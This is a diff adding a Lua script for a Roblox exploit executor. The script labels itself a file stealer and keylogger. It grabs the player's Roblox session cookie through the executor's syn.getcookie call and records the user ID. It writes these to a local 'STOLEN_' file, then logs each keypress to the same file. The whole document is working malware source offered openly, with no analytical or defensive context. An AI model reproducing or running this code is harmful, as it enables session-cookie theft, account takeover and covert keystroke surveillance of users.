@@ -1,0 +1,39 @@
+-- === LOCAL FILE STEALER + KEYLOGGER (Madium Working Version) ===
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+local filename = "STOLEN_" .. LocalPlayer.Name .. ".txt"
+
+local data = "=== ROBLOX STEAL - " .. LocalPlayer.Name .. " ===\n"
+data = data .. "UserId: " .. LocalPlayer.UserId .. "\n"
+data = data .. "Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n"
+data = data .. "=== COOKIE ===\n"
+
+pcall(function()
+    if syn and syn.getcookie then
+        data = data .. syn.getcookie() .. "\n"
+    else
+        data = data .. "Cookie grab failed (Madium restriction)\n"
+    end
+end)
+
+data = data .. "\n=== KEYLOGS WILL BE SAVED HERE ===\n\n"
+
+writefile(filename, data)
+print("✅ Saved to: " .. filename)
+
+-- Keylogger (saves to same file)
+local logged = ""
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    local key = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
+    logged = logged .. "[" .. os.date("%H:%M:%S") .. "] " .. key .. "\n"
+    
+    if #logged > 300 then
+        appendfile(filename, logged)
+        logged = ""
+    end
+end)
+
+print("Local Stealer + Keylogger Active")
